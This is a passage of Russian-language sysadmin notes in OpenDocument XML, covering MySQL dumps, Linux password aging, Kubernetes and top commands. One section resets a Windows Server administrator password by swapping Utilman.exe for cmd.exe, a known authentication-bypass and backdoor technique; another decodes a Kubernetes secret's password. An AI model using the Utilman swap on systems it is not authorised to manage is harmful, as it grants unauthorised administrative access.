      <text:p text:style-name="P13">+Бонус:</text:p>
      <text:p text:style-name="P13">SumatraPDF (https://www.sumatrapdfreader.org/) - мультиформатная читалка для Windows.</text:p>
      <text:p text:style-name="P1">Skim (https://skim-app.sourceforge.io/) - .pdf читалка с функционалом заметок для MacOS.</text:p>
      <text:p text:style-name="P4">PDF Viewer Plus (https://github.com/JavaCafe01/PdfViewer) - простая .pdf читалка для Android.</text:p>
      <text:p text:style-name="P1">Bash-скрипт для выполнения дампа всех баз данных MySQL, используемых на сервере:</text:p>
      <text:p text:style-name="P1">1- Для запуска скрипта необходимо дать права на исполнение скрипту командой chmod +x dump_all_databases.sh.</text:p>
      <text:p text:style-name="P1">2- Запустить скрипт выполнив одну из следующих команд:</text:p>
      <text:p text:style-name="P2" loext:marker-style-name="T1"><text:span text:style-name="T2">./dump_all_databases.sh</text:span><text:span text:style-name="T2"/></text:p>
      <text:p text:style-name="P2" loext:marker-style-name="T1"><text:span text:style-name="T2">sh dump_all_databases.sh</text:span><text:span text:style-name="T2"/></text:p>
      <text:p text:style-name="P1">bash dump_all_databases.sh</text:p>
      <text:p text:style-name="P1">3- Дождататься, когда выполниться процесс. Дампы будут сохранены в формате YYYYMMDD.name_db.sql.</text:p>
      <text:p text:style-name="P2" loext:marker-style-name="T1"><text:span text:style-name="T2">#!/usr/bin/env bash</text:span><text:span text:style-name="T2"/></text:p>
      <text:p text:style-name="P2" loext:marker-style-name="T1"><text:span text:style-name="T2">databases=`mysql -e "SHOW DATABASES;" | tr -d "| " | grep -v Database`</text:span><text:span text:style-name="T2"/></text:p>
      <text:p text:style-name="P2" loext:marker-style-name="T1"><text:span text:style-name="T2">for db in $databases; do</text:span><text:span text:style-name="T2"/></text:p>
      <text:p text:style-name="P2" loext:marker-style-name="T1"><text:span text:style-name="T2"><text:s text:c="4"/>if [[ "$db" != "information_schema" ]] &amp;&amp; [[ "$db" != "performance_schema" ]] &amp;&amp; [[ "$db" != "mysql" ]] &amp;&amp; [[ "$db" != _* ]] ; then</text:span><text:span text:style-name="T2"/></text:p>
      <text:p text:style-name="P2" loext:marker-style-name="T1"><text:span text:style-name="T2"><text:s text:c="8"/>echo "Dumping database: $db"</text:span><text:span text:style-name="T2"/></text:p>
      <text:p text:style-name="P2" loext:marker-style-name="T1"><text:span text:style-name="T2"><text:s text:c="8"/>mysqldump --databases $db &gt; `date +%Y%m%d`.$db.sql</text:span><text:span text:style-name="T2"/></text:p>
      <text:p text:style-name="P2" loext:marker-style-name="T1"><text:span text:style-name="T2"><text:s text:c="7"/># gzip $OUTPUT/`date +%Y%m%d`.$db.sql</text:span><text:span text:style-name="T2"/></text:p>
      <text:p text:style-name="P2" loext:marker-style-name="T1"><text:span text:style-name="T2"><text:s text:c="4"/>fi</text:span><text:span text:style-name="T2"/></text:p>
      <text:p text:style-name="P11" loext:marker-style-name="T1"><text:span text:style-name="T2">done</text:span><text:span text:style-name="T2"/></text:p>
      <text:p text:style-name="P2" loext:marker-style-name="T1"><text:soft-page-break/><text:span text:style-name="T2">Сброс пароля Windows Server на примере пользователя Администратор/Administrator Windows Server 2012/2016:</text:span><text:span text:style-name="T2"/></text:p>
      <text:p text:style-name="P2" loext:marker-style-name="T1"><text:span text:style-name="T2">1 - Нам потребуется образ Windows Server 2016, Windows Server 2012. </text:span><text:span text:style-name="T2"/></text:p>
      <text:p text:style-name="P2" loext:marker-style-name="T1"><text:span text:style-name="T2">2 - Подключаемся к серверу через IPMI, либо KVM, загружаем образ в VirtualMedia.</text:span><text:span text:style-name="T2"/></text:p>
      <text:p text:style-name="P2"><text:span text:style-name="T3">3 - После того, как образ был загружен, выполняем перезагрузку сервера. </text:span><text:span text:style-name="T2">При загрузке ОС будет сообщение Press any key to boot from CD or DVD. </text:span><text:span text:style-name="T3">Нажимаем любую клавишу и дожидаемся загрузки файлов. После загрузки файлов появится окно с выбором первоначальных параметров, жмём Далее. После этого нажимаем Восстановление системы.</text:span></text:p>
      <text:p text:style-name="P1">4 - В выборе действия нажимает Диагностика.</text:p>
      <text:p text:style-name="P1">5 - Далее выбираем Командная строка. Для начала необходимо найти системный диск, выполним команду:</text:p>
      <text:p text:style-name="P2"><text:span text:style-name="T3"><text:s text:c="4"/></text:span><text:span text:style-name="T2">echo</text:span><text:span text:style-name="T3"> %</text:span><text:span text:style-name="T2">windir</text:span><text:span text:style-name="T3">%</text:span></text:p>
      <text:p text:style-name="P1">6 - Команда выведет системный диск. Переходим в него:</text:p>
      <text:p text:style-name="P2"><text:span text:style-name="T3"><text:s text:c="4"/></text:span><text:span text:style-name="T2">C</text:span><text:span text:style-name="T3">: <text:s text:c="3"/></text:span></text:p>
      <text:p text:style-name="P2"><text:span text:style-name="T3">7 - В случае, если диск </text:span><text:span text:style-name="T2">C</text:span><text:span text:style-name="T3"> является системным. Далее переходим в </text:span><text:span text:style-name="T2">System</text:span><text:span text:style-name="T3">32:</text:span></text:p>
      <text:p text:style-name="P2"><text:span text:style-name="T3"><text:s text:c="4"/></text:span><text:span text:style-name="T2">cd</text:span><text:span text:style-name="T3"> </text:span><text:span text:style-name="T2">Windows</text:span><text:span text:style-name="T3">\</text:span><text:span text:style-name="T2">System</text:span><text:span text:style-name="T3">32</text:span></text:p>
      <text:p text:style-name="P14"><text:span text:style-name="T3">8 - Далее переименовываем </text:span><text:span text:style-name="T2">Utilman</text:span><text:span text:style-name="T3">.</text:span><text:span text:style-name="T2">exe</text:span><text:span text:style-name="T3"> на </text:span><text:span text:style-name="T2">Utilman</text:span><text:span text:style-name="T3">.</text:span><text:span text:style-name="T2">exe</text:span><text:span text:style-name="T3">.</text:span><text:span text:style-name="T2">old</text:span><text:span text:style-name="T3">:</text:span></text:p>
      <text:p text:style-name="P14"><text:span text:style-name="T3"><text:s text:c="4"/></text:span><text:span text:style-name="T2">ren Utilman.exe Utilman.exe.old</text:span></text:p>
      <text:p text:style-name="P2"><text:span text:style-name="T3">9 - Выполняем замену </text:span><text:span text:style-name="T2">cmd</text:span><text:span text:style-name="T3"> на </text:span><text:span text:style-name="T2">Utilman</text:span><text:span text:style-name="T3">.</text:span><text:span text:style-name="T2">exe</text:span></text:p>
      <text:p text:style-name="P2"><text:span text:style-name="T3"><text:s text:c="4"/></text:span><text:span text:style-name="T2">copy</text:span><text:span text:style-name="T3"> </text:span><text:span text:style-name="T2">cmd</text:span><text:span text:style-name="T3">.</text:span><text:span text:style-name="T2">exe</text:span><text:span text:style-name="T3"> </text:span><text:span text:style-name="T2">Utilman</text:span><text:span text:style-name="T3">.</text:span><text:span text:style-name="T2">exe</text:span><text:span text:style-name="T3"> <text:s text:c="4"/></text:span></text:p>
      <text:p text:style-name="P2"><text:span text:style-name="T3">10 - После этого закрываем консоль и нажимаем кнопку Продолжить. После загрузки сервера появится экран ввода логина и пароля. Нажимаем </text:span><text:span text:style-name="T2">Win</text:span><text:span text:style-name="T3"> + </text:span><text:span text:style-name="T2">U</text:span><text:span text:style-name="T3"> и вводим следующую команду:</text:span></text:p>
      <text:p text:style-name="P2" loext:marker-style-name="T1"><text:span text:style-name="T2">net</text:span><text:span text:style-name="T3"> </text:span><text:span text:style-name="T2">user</text:span><text:span text:style-name="T3"> Администратор </text:span><text:span text:style-name="T2">new</text:span><text:span text:style-name="T3">_</text:span><text:span text:style-name="T2">password</text:span></text:p>
      <text:p text:style-name="P11"><text:span text:style-name="T3">где </text:span><text:span text:style-name="T2">new</text:span><text:span text:style-name="T3">_</text:span><text:span text:style-name="T2">password</text:span><text:span text:style-name="T3"> -- новый пароль пользователя Администратор. В </text:span><text:span text:style-name="T2">EN</text:span><text:span text:style-name="T3">-локализации пользователь имеет названиме </text:span><text:span text:style-name="T2">Administrator</text:span><text:span text:style-name="T3">. <text:s text:c="3"/></text:span></text:p>
      <text:p text:style-name="P2" loext:marker-style-name="T1"><text:span text:style-name="T2">findstr</text:span><text:span text:style-name="T3"> - выполняет поиск шаблонов текста в файлах </text:span><text:span text:style-name="T2">windows</text:span><text:span text:style-name="T3">:</text:span></text:p>
      <text:p text:style-name="P2" loext:marker-style-name="T1"><text:span text:style-name="T2">findstr [/b] [/e] [/l | /r] [/s] [/i] [/x] [/v] [/n] [/m] [/o] [/p] [/f:&lt;file&gt;] [/c:&lt;string&gt;] [/g:&lt;file&gt;] [/d:&lt;dirlist&gt;] [/a:&lt;colorattribute&gt;] [/off[line]] &lt;strings&gt; [&lt;drive&gt;:][&lt;path&gt;]&lt;filename&gt;[ ...]</text:span><text:span text:style-name="T2"/></text:p>
      <text:p text:style-name="P1">Параметр Описание</text:p>
      <text:p text:style-name="P2"><text:span text:style-name="T3">/</text:span><text:span text:style-name="T2">b</text:span><text:span text:style-name="T3"> Соответствует шаблону текста, если он находится в начале строки.</text:span></text:p>
      <text:p text:style-name="P2"><text:span text:style-name="T3">/</text:span><text:span text:style-name="T2">e</text:span><text:span text:style-name="T3"> Соответствует шаблону текста, если он находится в конце строки.</text:span></text:p>
      <text:p text:style-name="P2"><text:span text:style-name="T3">/</text:span><text:span text:style-name="T2">l</text:span><text:span text:style-name="T3"> Обрабатывает строки поиска буквально.</text:span></text:p>
      <text:p text:style-name="P2"><text:span text:style-name="T3">/</text:span><text:span text:style-name="T2">r</text:span><text:span text:style-name="T3"> Обрабатывает строки поиска в виде регулярных выражений. Это параметр по умолчанию.</text:span></text:p>
      <text:p text:style-name="P2"><text:span text:style-name="T3">/</text:span><text:span text:style-name="T2">s</text:span><text:span text:style-name="T3"> Выполняет поиск в текущем каталоге и во всех подкаталогах.</text:span></text:p>
      <text:p text:style-name="P2"><text:span text:style-name="T3">/</text:span><text:span text:style-name="T2">i</text:span><text:span text:style-name="T3"> Игнорирует регистр символов при поиске строки.</text:span></text:p>
      <text:p text:style-name="P2"><text:span text:style-name="T3">/</text:span><text:span text:style-name="T2">x</text:span><text:span text:style-name="T3"> Выводит строки, которые точно соответствуют друг другу.</text:span></text:p>
      <text:p text:style-name="P2"><text:span text:style-name="T3">/</text:span><text:span text:style-name="T2">v</text:span><text:span text:style-name="T3"> Выводит только те строки, которые не содержат совпадений.</text:span></text:p>
      <text:p text:style-name="P2"><text:span text:style-name="T3">/</text:span><text:span text:style-name="T2">n</text:span><text:span text:style-name="T3"> Выводит номер строки каждой соответствующей строки.</text:span></text:p>
      <text:p text:style-name="P2"><text:soft-page-break/><text:span text:style-name="T3">/</text:span><text:span text:style-name="T2">m</text:span><text:span text:style-name="T3"> Печатает только имя файла, если файл содержит совпадение.</text:span></text:p>
      <text:p text:style-name="P2"><text:span text:style-name="T3">/</text:span><text:span text:style-name="T2">o</text:span><text:span text:style-name="T3"> Выводит смещение символов перед каждой совпадающей строкой.</text:span></text:p>
      <text:p text:style-name="P2"><text:span text:style-name="T3">/</text:span><text:span text:style-name="T2">p</text:span><text:span text:style-name="T3"> Пропускает файлы с непечатаемыми символами.</text:span></text:p>
      <text:p text:style-name="P2"><text:span text:style-name="T3">"/</text:span><text:span text:style-name="T2">OFF</text:span><text:span text:style-name="T3">" [строка] Не пропускает файлы с установленным атрибутом </text:span><text:span text:style-name="T2">offline</text:span><text:span text:style-name="T3">.</text:span></text:p>
      <text:p text:style-name="P2"><text:span text:style-name="T3">ключа&lt;</text:span><text:span text:style-name="T2">file</text:span><text:span text:style-name="T3">&gt; Возвращает список файлов из указанного файла.</text:span></text:p>
      <text:p text:style-name="P2"><text:span text:style-name="T3">/</text:span><text:span text:style-name="T2">c</text:span><text:span text:style-name="T3">:&lt;</text:span><text:span text:style-name="T2">string</text:span><text:span text:style-name="T3">&gt; Использует указанный текст в качестве литеральной строки поиска.</text:span></text:p>
      <text:p text:style-name="P2"><text:span text:style-name="T3">/</text:span><text:span text:style-name="T2">g</text:span><text:span text:style-name="T3">&lt;</text:span><text:span text:style-name="T2">file</text:span><text:span text:style-name="T3">&gt; Возвращает строки поиска из указанного файла.</text:span></text:p>
      <text:p text:style-name="P2"><text:span text:style-name="T3">/</text:span><text:span text:style-name="T2">d</text:span><text:span text:style-name="T3">&lt;</text:span><text:span text:style-name="T2">dirlist</text:span><text:span text:style-name="T3">&gt; Выполняет поиск в указанном списке каталогов. Каждый каталог должен быть отделен точкой с запятой (например </text:span><text:span text:style-name="T2">dir</text:span><text:span text:style-name="T3">1;</text:span><text:span text:style-name="T2">dir</text:span><text:span text:style-name="T3">2;</text:span><text:span text:style-name="T2">dir</text:span><text:span text:style-name="T3">3 ,;).</text:span></text:p>
      <text:p text:style-name="P2"><text:span text:style-name="T3">/&lt;</text:span><text:span text:style-name="T2">colorattribute</text:span><text:span text:style-name="T3">&gt; Задает атрибуты цвета с двумя шестнадцатеричными цифрами. Введите </text:span><text:span text:style-name="T2">color</text:span><text:span text:style-name="T3"> /? Дополнительные сведения.</text:span></text:p>
      <text:p text:style-name="P2"><text:span text:style-name="T3">&lt;</text:span><text:span text:style-name="T2">strings</text:span><text:span text:style-name="T3">&gt; Задает текст для поиска в файле </text:span><text:span text:style-name="T2">filename</text:span><text:span text:style-name="T3">. Обязательный.</text:span></text:p>
      <text:p text:style-name="P2"><text:span text:style-name="T3">[\&lt;</text:span><text:span text:style-name="T2">drive</text:span><text:span text:style-name="T3">&gt;:][&lt;</text:span><text:span text:style-name="T2">path</text:span><text:span text:style-name="T3">&gt;]&lt;</text:span><text:span text:style-name="T2">filename</text:span><text:span text:style-name="T3">&gt;[...] Указывает расположение и файл или файлы для поиска. Требуется по крайней мере одно имя файла.</text:span></text:p>
      <text:p text:style-name="P1">/? Отображает справку в командной строке.</text:p>
      <text:p text:style-name="P1">Допустимые мета-символы:</text:p>
      <text:p text:style-name="P1">. Подстановочный знак - любой символ</text:p>
      <text:p text:style-name="P1">* Повтор - ноль или более вхождений предыдущего символа или класса.</text:p>
      <text:p text:style-name="P1">^ Начальное расположение строки - начало строки.</text:p>
      <text:p text:style-name="P1">$ Конечное расположение строки - конец строки.</text:p>
      <text:p text:style-name="P14"><text:span text:style-name="T3">[</text:span><text:span text:style-name="T2">class</text:span><text:span text:style-name="T3">] Класс символов - любой символ в наборе.</text:span></text:p>
      <text:p text:style-name="P14"><text:span text:style-name="T3">[^</text:span><text:span text:style-name="T2">class</text:span><text:span text:style-name="T3">] Обратный класс - любой символ, не наявляющийся в наборе.</text:span></text:p>
      <text:p text:style-name="P2"><text:span text:style-name="T3">[</text:span><text:span text:style-name="T2">x</text:span><text:span text:style-name="T3">-</text:span><text:span text:style-name="T2">y</text:span><text:span text:style-name="T3">] </text:span><text:span text:style-name="T2">Range</text:span><text:span text:style-name="T3"> - все символы в указанном диапазоне.</text:span></text:p>
      <text:p text:style-name="P2"><text:span text:style-name="T3">\</text:span><text:span text:style-name="T2">x</text:span><text:span text:style-name="T3"> </text:span><text:span text:style-name="T2">Escape</text:span><text:span text:style-name="T3"> - литеральное использование мета-символа.</text:span></text:p>
      <text:p text:style-name="P2"><text:span text:style-name="T3">\&lt;</text:span><text:span text:style-name="T2">string</text:span><text:span text:style-name="T3"> Начальное расположение слова - начало слова.</text:span></text:p>
      <text:p text:style-name="P11" loext:marker-style-name="T1"><text:span text:style-name="T2">string</text:span><text:span text:style-name="T3">\&gt; Конечное расположение слова -конец слова.</text:span></text:p>
      <text:p text:style-name="P1">Как заставить пользователя изменить пароль при следующем входе в систему? Существует несколько способов. Использование команды passwd</text:p>
      <text:p text:style-name="P1">#sudo passwd --expire [username]</text:p>
      <text:p text:style-name="P1">Использование команды chage</text:p>
      <text:p text:style-name="P1">#sudo chage --lastday 0 [username]</text:p>
      <text:p text:style-name="P1">Срок действия паролей</text:p>
      <text:p text:style-name="P1">#chage -l</text:p>
      <text:p text:style-name="P1">Будет выведена следующая информация:</text:p>
      <text:p text:style-name="P1">Когда пароль был последний раз изменен;</text:p>
      <text:p text:style-name="P1">Дата окончания действия пароля;</text:p>
      <text:p text:style-name="P1">Сколько дней осталось до окончания действия пароля;</text:p>
      <text:p text:style-name="P1">Когда учетная запись пользователя будет закончена (можно, пожалуйста, далее мы будем говорить «заэкспайрится»?)</text:p>
      <text:p text:style-name="P1">Минимальное количество дней между итерацией смены пароля;</text:p>
      <text:p text:style-name="P1">Максимальное количество дней между итерацией смены пароля;</text:p>
      <text:p text:style-name="P1">Заставляем пользователя менять пароль каждые 90 дней</text:p>
      <text:p text:style-name="P1">#sudo chage -M 90</text:p>
      <text:p text:style-name="P2"><text:soft-page-break/><text:span text:style-name="T3">Задаем срок жизни учетной записи (до 12 июня 2023)</text:span></text:p>
      <text:p text:style-name="P2" loext:marker-style-name="T1"><text:span text:style-name="T2">#sudo chage -E 2023-06-12 serg</text:span><text:span text:style-name="T2"/></text:p>
      <text:p text:style-name="P2" loext:marker-style-name="T1"><text:span text:style-name="T2">#sudo chage -E 2023-06-12 oleg</text:span><text:span text:style-name="T2"/></text:p>
      <text:p text:style-name="P1">Сколько времени на смену пароля? В примере даем Борису 10 дней на смену пароля с момента как пароль заэкспайрился</text:p>
      <text:p text:style-name="P1">#sudo chage -I 10 boris</text:p>
      <text:p text:style-name="P1">Уведомление о смене пароля заранее: Через 25 дней истекает срок годности пароля Бориса</text:p>
      <text:p text:style-name="P1">#sudo chage -W 25 boris</text:p>
      <text:p text:style-name="P1">Защищаемся от частой смены паролей пользователя: Минимальное количество дней между сменой паролей</text:p>
      <text:p text:style-name="P1">#sudo chage -m 25 boris</text:p>
      <text:p text:style-name="P1">Удалить ограничение в днях</text:p>
      <text:p text:style-name="P7">#sudo chage -m 0 sergey</text:p>
      <text:p text:style-name="P1">Kubernetes: эффективные команды Расшировать параметр секрета: kubectl get secret/db -o yaml | grep DB_PASSWORD | sed 's/.*DB_PASSWORD:\s//' | base64 --decode</text:p>
      <text:p text:style-name="P1">где db - имя секрета, DB_PASSWORD - один из параметров секрета.</text:p>
      <text:p text:style-name="P1">Удалить все поды используя helm: helm ls --all --short | xargs -L1 helm delete</text:p>
      <text:p text:style-name="P1">Удалить все поды в состоянии Evicted: kubectl get pods | grep Evicted | awk '{print $1}' | xargs kubectl delete pod</text:p>
      <text:p text:style-name="P1">Скрипт для просмотра занятого пространства образами docker:</text:p>
      <text:p text:style-name="P14" loext:marker-style-name="T1"><text:span text:style-name="T2">#!/usr/bin/env bash</text:span></text:p>
      <text:p text:style-name="P14" loext:marker-style-name="T1"><text:span text:style-name="T2">for container in `kubectl get pods --template '{{range .items}}{{.metadata.name}}{{"\n"}}{{end}}'`</text:span></text:p>
      <text:p text:style-name="P2" loext:marker-style-name="T1"><text:span text:style-name="T2">do</text:span><text:span text:style-name="T2"/></text:p>
      <text:p text:style-name="P2" loext:marker-style-name="T1"><text:span text:style-name="T2">echo -e "$container\t\t $(docker image ls `kubectl get pod $container -o jsonpath='{.spec.containers[0].image}'` --format='{{println .Size}}')"</text:span><text:span text:style-name="T2"/></text:p>
      <text:p text:style-name="P1">done</text:p>
      <text:p text:style-name="P1">Скрипт для для установления соответствия между задеплоеными подами, нодами, где они находятся и зоной в которой располагаются.</text:p>
      <text:p text:style-name="P2" loext:marker-style-name="T1"><text:span text:style-name="T2">#!/usr/bin/env bash</text:span><text:span text:style-name="T2"/></text:p>
      <text:p text:style-name="P2" loext:marker-style-name="T1"><text:span text:style-name="T2">set -euo pipefail</text:span><text:span text:style-name="T2"/></text:p>
      <text:p text:style-name="P2" loext:marker-style-name="T1"><text:span text:style-name="T2">PODZONES=()</text:span><text:span text:style-name="T2"/></text:p>
      <text:p text:style-name="P2" loext:marker-style-name="T1"><text:span text:style-name="T2">for POD in $(kubectl get pods -o custom-columns=NAME:.metadata.name --no-headers)</text:span><text:span text:style-name="T2"/></text:p>
      <text:p text:style-name="P2" loext:marker-style-name="T1"><text:span text:style-name="T2"><text:s text:c="2"/>do</text:span><text:span text:style-name="T2"/></text:p>
      <text:p text:style-name="P2" loext:marker-style-name="T1"><text:span text:style-name="T2"><text:s text:c="4"/>NODE=$(kubectl get pod ${POD} -o=jsonpath='{.spec.nodeName}')</text:span><text:span text:style-name="T2"/></text:p>
      <text:p text:style-name="P2" loext:marker-style-name="T1"><text:span text:style-name="T2"><text:s text:c="4"/>ZONE=$(kubectl get nodes -o json | jq <text:s/>-r --arg NODE "${NODE}" '.items[].metadata | {name, labels} | select(.name==$NODE) | .labels."topology.kubernetes.io/zone"')</text:span><text:span text:style-name="T2"/></text:p>
      <text:p text:style-name="P2" loext:marker-style-name="T1"><text:span text:style-name="T2"><text:s text:c="4"/>PODZONES+=(${ZONE})</text:span><text:span text:style-name="T2"/></text:p>
      <text:p text:style-name="P2" loext:marker-style-name="T1"><text:span text:style-name="T2"><text:s text:c="4"/>echo -e "${POD}\t${NODE}\t${ZONE}"</text:span><text:span text:style-name="T2"/></text:p>
      <text:p text:style-name="P2" loext:marker-style-name="T1"><text:soft-page-break/><text:span text:style-name="T2">done</text:span><text:span text:style-name="T2"/></text:p>
      <text:p text:style-name="P2" loext:marker-style-name="T1"><text:span text:style-name="T2">CPODS=$(kubectl get pods -o custom-columns=NAME:.metadata.name --no-headers | wc -l)</text:span><text:span text:style-name="T2"/></text:p>
      <text:p text:style-name="P2" loext:marker-style-name="T1"><text:span text:style-name="T2">CNODES=$(kubectl get nodes -o custom-columns=NAME:.metadata.name --no-headers | wc -l)</text:span><text:span text:style-name="T2"/></text:p>
      <text:p text:style-name="P2" loext:marker-style-name="T1"><text:span text:style-name="T2">CZONES=$(kubectl get nodes -o json | jq <text:s/>-r '.items[].metadata.labels."topology.kubernetes.io/zone"' | sort | uniq -c)</text:span><text:span text:style-name="T2"/></text:p>
      <text:p text:style-name="P2" loext:marker-style-name="T1"><text:span text:style-name="T2">echo "----------</text:span><text:span text:style-name="T3">ИТОГО</text:span><text:span text:style-name="T2">:----------"</text:span></text:p>
      <text:p text:style-name="P2" loext:marker-style-name="T1"><text:span text:style-name="T2">echo -e "</text:span><text:span text:style-name="T3">Всего</text:span><text:span text:style-name="T2"> </text:span><text:span text:style-name="T3">подов</text:span><text:span text:style-name="T2">:\t${CPODS}"</text:span></text:p>
      <text:p text:style-name="P2" loext:marker-style-name="T1"><text:span text:style-name="T2">echo -e "</text:span><text:span text:style-name="T3">Всего</text:span><text:span text:style-name="T2"> </text:span><text:span text:style-name="T3">нод</text:span><text:span text:style-name="T2">:\t${CNODES}"</text:span></text:p>
      <text:p text:style-name="P1">echo -e "Количество зон нод:\n${CZONES}"</text:p>
      <text:p text:style-name="P1">echo "Количество подов в зонах:"</text:p>
      <text:p text:style-name="P11" loext:marker-style-name="T1"><text:span text:style-name="T2">printf "%s\n" "${PODZONES[@]}" | sort | uniq -c</text:span><text:span text:style-name="T2"/></text:p>
      <text:p text:style-name="P2"><text:span text:style-name="T3">Сохраняем вывода команды </text:span><text:span text:style-name="T2">Top</text:span><text:span text:style-name="T3"> в файл. Поскольку я не использовал опцию </text:span><text:span text:style-name="T2">delay</text:span><text:span text:style-name="T3">, приведенная ниже команда </text:span><text:span text:style-name="T2">top</text:span><text:span text:style-name="T3"> перенаправит вывод команды </text:span><text:span text:style-name="T2">top</text:span><text:span text:style-name="T3"> за одну итерацию в файл.</text:span></text:p>
      <text:p text:style-name="P2" loext:marker-style-name="T1"><text:span text:style-name="T2">top -b -n 1 &gt; /home/i_odmin/backup/output.txt</text:span><text:span text:style-name="T2"/></text:p>
      <text:p text:style-name="P2"><text:span text:style-name="T3">Сохранение вывода команды </text:span><text:span text:style-name="T2">top</text:span><text:span text:style-name="T3"> с более чем одной итерацией из 5 итераций. Обычно программа работает непрерывно с задержкой в 2 секунды, и вы можете изменить это значение, добавив в верхнюю команду значение ‘-</text:span><text:span text:style-name="T2">d</text:span><text:span text:style-name="T3">’, как показано ниже:</text:span></text:p>
      <text:p text:style-name="P2" loext:marker-style-name="T1"><text:span text:style-name="T2">#top -n 5 -d 4 -b &gt;/backup/output_1.txt</text:span><text:span text:style-name="T2"/></text:p>
      <text:p text:style-name="P14"><text:span text:style-name="T3">Как захватить вывод команды </text:span><text:span text:style-name="T2">top</text:span><text:span text:style-name="T3"> в файл каждые 5 минут в течение часа? Система создает отдельный файл каждые 5 минут, который поможет вам определить список процессов, которые потребляли больше </text:span><text:span text:style-name="T2">CPU</text:span><text:span text:style-name="T3"> и памяти в системе. Добавляем следующий </text:span><text:span text:style-name="T2">cronjob</text:span><text:span text:style-name="T3">, который будет выполняться с 5 до 6 утра каждые 5 минут в течение часа.</text:span></text:p>
      <text:p text:style-name="P13">Где:</text:p>
      <text:p text:style-name="P2"><text:span text:style-name="T3">-</text:span><text:span text:style-name="T2">n</text:span><text:span text:style-name="T3"> : Задает максимальное количество итераций;</text:span></text:p>
      <text:p text:style-name="P2"><text:span text:style-name="T3">-</text:span><text:span text:style-name="T2">b</text:span><text:span text:style-name="T3"> : Работа в пакетном режиме (Запуск команды </text:span><text:span text:style-name="T2">top</text:span><text:span text:style-name="T3"> в пакетном режиме для перенаправления вывода в другие программы или в файл);</text:span></text:p>
      <text:p text:style-name="P2"><text:span text:style-name="T3">-</text:span><text:span text:style-name="T2">d</text:span><text:span text:style-name="T3"> : Интервал задержки (Задает задержку между обновлениями экрана).</text:span></text:p>
      <text:p text:style-name="P2" loext:marker-style-name="T1"><text:span text:style-name="T2">#0-59/5 5 * * * top -n 10 -d 4 -b &gt; /home/i_odmin/backup/top_out-`date +\%Y\%m\%d\%H\%M\%S`.txt</text:span><text:span text:style-name="T2"/></text:p>
      <text:p text:style-name="P2"><text:span text:style-name="T3">Собраем вывод в один файл, используйте следующий </text:span><text:span text:style-name="T2">cronjob</text:span><text:span text:style-name="T3">. </text:span><text:span text:style-name="T2">Cronjob</text:span><text:span text:style-name="T3"> будет выполняться с 9 до 10 утра каждые 5 минут в течение часа и добавлять результаты в один файл.</text:span></text:p>
      <text:p text:style-name="P2" loext:marker-style-name="T1"><text:span text:style-name="T2">#0-59/5 9 * * * top -b -n5 -d 5 &gt;&gt;/home/i_odmin/backup/output.txt</text:span><text:span text:style-name="T2"/></text:p>
      <text:p text:style-name="P2"><text:span text:style-name="T3">Записываем вывод команды </text:span><text:span text:style-name="T2">top</text:span><text:span text:style-name="T3"> в файл каждые 5 минут в течение получаса. Добавляем следующий </text:span><text:span text:style-name="T2">cronjob</text:span><text:span text:style-name="T3">, который будет запускаться каждые 5 минут с 13:30 до 14:00 в течение получаса.</text:span></text:p>
      <text:p text:style-name="P11" loext:marker-style-name="T1"><text:span text:style-name="T2">#30-59/5 13 * * * top -n 10 -d 4 -b &gt; /home/i_odmin/backup/top_out-`date +\%Y\%m\%d\%H\%M\%S`.txt</text:span><text:span text:style-name="T2"/></text:p>
      <text:p text:style-name="P2" loext:marker-style-name="T1"><text:soft-page-break/><text:span text:style-name="T2">kill</text:span><text:span text:style-name="T3"> - команда для принудительного завершения исполнения процесса:</text:span></text:p>
      <text:p text:style-name="P2"><text:span text:style-name="T3">Команда </text:span><text:span text:style-name="T2">kill</text:span><text:span text:style-name="T3"> является встроенной командой командной оболочки, предназначенной для отправки системных сигналов определенным процессам. Команда принимает числовые идентификаторы процессов, а также числовые или текстовые идентификаторы сигналов. Чаще всего данная команда используется для принудительного завершения работы определенных процессов. Базовый синтаксис команды выглядит следующим образом:</text:span></text:p>
      <text:p text:style-name="P2"><text:span text:style-name="T3">$ </text:span><text:span text:style-name="T2">kill</text:span><text:span text:style-name="T3"> [параметры] идентификатор-процесса</text:span></text:p>
      <text:p text:style-name="P2"><text:span text:style-name="T3">Команда поддерживает ряд параметров командной строки. Наиболее полезным параметром является параметр -</text:span><text:span text:style-name="T2">s</text:span><text:span text:style-name="T3">, позволяющий указать системный сигнал, который может быть отправлен заданному процессу, а также параметр -</text:span><text:span text:style-name="T2">l</text:span><text:span text:style-name="T3">, позволяющий вывести список поддерживаемых системных сигналов. Вообще, сигналы могут задаваться в нескольких форматах:</text:span></text:p>
      <text:p text:style-name="P2"><text:span text:style-name="T3">В формате имени сигнала после параметра -</text:span><text:span text:style-name="T2">s</text:span><text:span text:style-name="T3"> (-</text:span><text:span text:style-name="T2">s</text:span><text:span text:style-name="T3"> </text:span><text:span text:style-name="T2">SIGKILL</text:span><text:span text:style-name="T3">)</text:span></text:p>
      <text:p text:style-name="P2"><text:span text:style-name="T3">В формате номера сигнала после параметра -</text:span><text:span text:style-name="T2">n</text:span><text:span text:style-name="T3"> (-</text:span><text:span text:style-name="T2">n</text:span><text:span text:style-name="T3"> 5)</text:span></text:p>
      <text:p text:style-name="P1">В формате номера сигнала (-5)</text:p>
      <text:p text:style-name="P2"><text:span text:style-name="T3">В формате имени сигнала с префиксом </text:span><text:span text:style-name="T2">SIG</text:span><text:span text:style-name="T3"> (-</text:span><text:span text:style-name="T2">SIGKILL</text:span><text:span text:style-name="T3">)</text:span></text:p>
      <text:p text:style-name="P2"><text:span text:style-name="T3">В формате имени сигнала без префикса </text:span><text:span text:style-name="T2">SIG</text:span><text:span text:style-name="T3"> (-</text:span><text:span text:style-name="T2">KILL</text:span><text:span text:style-name="T3">).</text:span></text:p>
      <text:p text:style-name="P2"><text:span text:style-name="T3">По умолчанию команда осуществляет осуществляет отправку сигнала </text:span><text:span text:style-name="T2">SIGTERM</text:span><text:span text:style-name="T3"> для корректного завершения работы процессов. Отрицательные значения идентификаторов используются для указания групп процессов, которым нужно отправить сигналы. Идентификатор -1 является специализированным идентификатором и используется для отправки сигналов всем запущенным процессам за исключением </text:span><text:span text:style-name="T2">kill</text:span><text:span text:style-name="T3"> и </text:span><text:span text:style-name="T2">init</text:span><text:span text:style-name="T3">. Для получения идентификаторов процессов могут использоваться утилиты </text:span><text:span text:style-name="T2">ps</text:span><text:span text:style-name="T3"> и </text:span><text:span text:style-name="T2">top</text:span><text:span text:style-name="T3">. Примеры использования. Получение списка поддерживаемых системных сигналов. Для того, чтобы получить список поддерживаемых системных сигналов, достаточно 